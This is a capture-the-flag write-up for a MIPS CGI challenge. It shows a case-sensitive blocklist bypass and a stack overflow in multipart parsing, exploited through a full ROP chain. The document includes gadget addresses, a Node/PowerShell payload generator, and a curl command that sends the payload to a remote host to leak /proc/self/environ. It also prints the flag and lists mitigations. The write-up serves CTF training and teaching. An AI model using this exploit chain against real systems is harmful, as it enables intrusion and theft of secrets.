# EU Filter - upCTF Writeup

## Challenge

**Name:** EU Filter  
**Category:** Pwn / Binary Exploitation (CGI on MIPS)  
**Goal:** Reach `discord.com` / recover flag in format `upCTF{...}`

## TL;DR

There are two useful bugs:

1. **Case-sensitive blocklist check** (`discord.com` blocked, `Discord.com` allowed).
2. **Stack buffer overflow** in multipart `name` parsing inside the MIPS CGI binary, enabling ROP.

The final flag was recovered by ROP-ing syscalls to read `/proc/self/environ` and exfiltrate `FLAG=upCTF{...}` in HTTP response body.

Final flag:

`upCTF{jus7_s4y_1ts_f0r_7h3_ch1ldr3n-9sMH3wbG1be9a3de}`

---

## Files Provided

From the challenge package:

- `dist/www/cgi-bin/eufilter.bin` (MIPS ELF CGI binary)
- `dist/www/cgi-bin/eufilter.cgi` (wrapper script: runs binary with qemu-mips)
- `dist/www/*.html` (frontend pages)
- `dist/Dockerfile`, `entrypoint.sh`, `httpd.conf`

`eufilter.cgi`:

```sh
#!/bin/sh
exec /usr/bin/qemu-mips /www/cgi-bin/eufilter.bin
```

So all logic is in `eufilter.bin`.

---

## Initial Recon

### 1. Run locally

```powershell
docker build -t eufilter-local .\eufilter\dist
docker run --rm -d -p 4006:4006 --name eufilter-test eufilter-local
```

### 2. Observe normal behavior

```powershell
curl.exe -i "http://127.0.0.1:4006/cgi-bin/eufilter.cgi?url=example.com"
# -> 302 /allowed.html?url=example.com

curl.exe -i "http://127.0.0.1:4006/cgi-bin/eufilter.cgi?url=discord.com"
# -> 302 /verify.html?url=discord.com
```

### 3. Quick bypass found

```powershell
curl.exe -i "http://127.0.0.1:4006/cgi-bin/eufilter.cgi?url=Discord.com"
# -> 302 /allowed.html?url=Discord.com
```

So domain matching is case-sensitive (bad canonicalization).

---

## Reverse Engineering Highlights

Using MIPS binutils in container:

```powershell
docker exec -u 0 eufilter-test /bin/sh -lc "apt-get update >/dev/null && apt-get install -y binutils-mips-linux-gnu >/dev/null"
docker exec eufilter-test mips-linux-gnu-nm -n /www/cgi-bin/eufilter.bin
```

Important symbols:

- `is_blocked` at `0x004007f0`
- `get_param` at `0x004008b0`
- `parse_multipart` at `0x00400b1c`
- `handle_check` at `0x00400e0c`
- `handle_verify` at `0x00400f1c`
- `main` at `0x00401194`
- useful tiny gadgets in `selftest` region (`0x00400a5c`..`0x00400b04`)

### Blocklist logic

`is_blocked` uses `strstr` against static entries (`discord.com`, etc), so mixed-case bypasses work.

### Overflow root cause

In `handle_verify`:

- body read into global buffer
- multipart parsed
- `name` field copied into **stack buffer of 64 bytes** via `parse_multipart`
- no bounds check before copying

Saved return address is reachable from `name` data (offset ~72 bytes), giving PC control.

### ROP-enabling gadgets

In `selftest` block there are short sequences that load syscall args then return:

- `0x00400a74`: load `v0` from stack frame
- `0x00400a8c`: load `a0`
- `0x00400aa4`: load `a1`
- `0x00400abc`: load `a2`
- `0x00400aec`: `syscall`

This allows stitching direct Linux MIPS syscalls (`open`, `read`, `write`, `exit`).

---

## Exploit Development Path

## Step A: Prove control

A payload with overwritten RA produced `Empty reply` / SIGBUS and eventually controlled `write(1, ...)` output (`HI`), confirming stable ROP entry.

## Step B: Leak `/flag` locally

`open('/flag') -> read -> write` worked on local test image when `/flag` was seeded.

## Step C: Remote adaptation

On remote host, `/flag` read returned only filler, so likely flag was not there (or inaccessible path).  
Pivoted to:

- `open('/proc/self/environ')`
- large `read`
- HTTP-safe exfiltration by writing `Content-Type: text/plain\r\n\r\n` first
- then writing leaked bytes

This exposed `FLAG=upCTF{...}` in environment data.

---

## Final Exploit Script (PowerShell + Node)

This reproduces the successful remote extraction method.

```powershell
$js = @'
const fs = require('fs');
function be32(x){ const b=Buffer.alloc(4); b.writeUInt32BE(x>>>0); return b; }
function frame(w0,w1,w2,w3){ return Buffer.concat([be32(w0),be32(w1),be32(w2),be32(w3)]); }

const g_v0=0x00400a74, g_a0=0x00400a8c, g_a1=0x00400aa4, g_a2=0x00400abc, g_sys=0x00400aec;
const g_id_photo=0x00411740, path=g_id_photo, hdr=g_id_photo+0x80, buf=g_id_photo+0x800;
const n=0x1000;
const header=Buffer.from('Content-Type: text/plain\r\n\r\n','ascii');

const ch=[];
ch.push(Buffer.from('A'.repeat(72),'ascii'));
ch.push(be32(g_v0));

// open(path, O_RDONLY=0, 0)
ch.push(frame(0,0,4005,g_a0));
ch.push(frame(0,0,path,g_a1));
ch.push(frame(0,0,0,g_a2));
ch.push(frame(0,0,0,g_sys));
ch.push(frame(0,0,g_v0,0));

// read(fd=3, buf, n)
ch.push(frame(0,0,4003,g_a0));
ch.push(frame(0,0,3,g_a1));
ch.push(frame(0,0,buf,g_a2));
ch.push(frame(0,0,n,g_sys));
ch.push(frame(0,0,g_v0,0));

// write CGI header first
ch.push(frame(0,0,4004,g_a0));
ch.push(frame(0,0,1,g_a1));
ch.push(frame(0,0,hdr,g_a2));
ch.push(frame(0,0,header.length,g_sys));
ch.push(frame(0,0,g_v0,0));

// write leaked bytes
ch.push(frame(0,0,4004,g_a0));
ch.push(frame(0,0,1,g_a1));
ch.push(frame(0,0,buf,g_a2));
ch.push(frame(0,0,n,g_sys));
ch.push(frame(0,0,g_v0,0));

// exit(0)
ch.push(frame(0,0,4001,g_a0));
ch.push(frame(0,0,0,g_sys));
ch.push(frame(0,0,0,0));

const name=Buffer.concat(ch);
const id=Buffer.alloc(3000,0x42);
Buffer.from('/proc/self/environ\x00','binary').copy(id,0);
header.copy(id,0x80);

const pre1=Buffer.from('------x\r\nContent-Disposition: form-data; name="name"\r\n\r\n','ascii');
const mid =Buffer.from('\r\n------x\r\nContent-Disposition: form-data; name="id_photo"; filename="a.bin"\r\nContent-Type: application/octet-stream\r\n\r\n','ascii');
const end =Buffer.from('\r\n------x--\r\n','ascii');

fs.writeFileSync('exploit_environ_big.bin', Buffer.concat([pre1,name,mid,id,end]));
'@
Set-Content .\gen_exploit_environ_big.js $js -Encoding ascii
node .\gen_exploit_environ_big.js

curl.exe --max-time 20 -sS -o .\remote_body.bin -X POST "http://46.225.117.62:30018/cgi-bin/eufilter.cgi?url=discord.com" -H "Content-Type: multipart/form-data; boundary=----x" --data-binary "@exploit_environ_big.bin"

$txt=[Text.Encoding]::ASCII.GetString([IO.File]::ReadAllBytes('.\remote_body.bin'))
[regex]::Match($txt,'upCTF\{[^}]+\}').Value
```

Output:

```text
upCTF{jus7_s4y_1ts_f0r_7h3_ch1ldr3n-9sMH3wbG1be9a3de}
```

---

## Why This Worked

- The multipart parser let attacker-controlled `name` overwrite stack control data.
- Statically linked code region provided simple ROP gadgets to set syscall registers.
- CGI process had permission to read process environment, where `FLAG` was exposed.
- Writing valid CGI response headers before leaked bytes ensured BusyBox returned body to client.

---

## Security Issues Summary

1. **Input canonicalization failure**: case-sensitive blocklist checks.
2. **Stack overflow**: unbounded copy from multipart field into fixed stack buffer.
3. **Insecure secret exposure**: sensitive flag in process environment.
4. **No hardening** (practical impact): exploitable control-flow hijack in CGI context.

---

## Mitigations

- Normalize and parse URLs correctly before policy checks.
- Replace fixed-size stack copies with bounded APIs and explicit length checks.
- Use allowlist policy and strict host parsing.
- Do not store secrets in process env for untrusted-process contexts.
- Compile with protections: stack canaries, PIE, full RELRO, NX, FORTIFY.
- Sandbox CGI process with minimal privileges and seccomp profile.

---

## Notes

- The `Discord.com` bypass alone solves the "reach discord" narrative part.
- The actual CTF flag required memory corruption exploitation and data exfiltration.
- Addresses/gadgets in this writeup are from this binary build and may vary if rebuilt.
